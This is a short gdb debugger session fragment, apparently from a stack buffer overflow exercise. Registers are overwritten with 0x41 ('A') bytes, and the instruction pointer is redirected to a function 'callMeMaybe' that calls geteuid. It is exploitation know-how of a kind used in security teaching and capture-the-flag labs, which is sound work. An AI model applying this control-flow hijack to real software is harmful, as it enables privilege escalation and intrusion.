0x383e8661878:	0x00000383e86618e8	0x000002ed77e3b1c8
0x383e8661888:	0x000002ed77c271f3	0x0000000000000000
0x383e8661898:	0x0000000000000000	0x00000000004005e0
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x4141414141414141  RSP: 0x00000383E8661800  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEEB  RDX: 0x000002ED77C129E0  RCX: 0x0000000000000114  RIP: 0x00000000004006CD
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002ED77C0F6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x00000383E86618D0  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x4006cd <callMeMaybe>:	push   rbp
   0x4006ce <callMeMaybe+1>:	mov    rbp,rsp
   0x4006d1 <callMeMaybe+4>:	push   rbx
   0x4006d2 <callMeMaybe+5>:	sub    rsp,0x8
   0x4006d6 <callMeMaybe+9>:	call   0x400590 <geteuid@plt>
   0x4006db <callMeMaybe+14>:	mov    ebx,eax
   0x4006dd <callMeMaybe+16>:	call   0x400590 <geteuid@plt>
   0x4006e2 <callMeMaybe+21>:	mov    esi,ebx
-----------------------------------------------------------------------------------------------------------------------------
0x00000000004006cd in callMeMaybe ()
gdb$ 
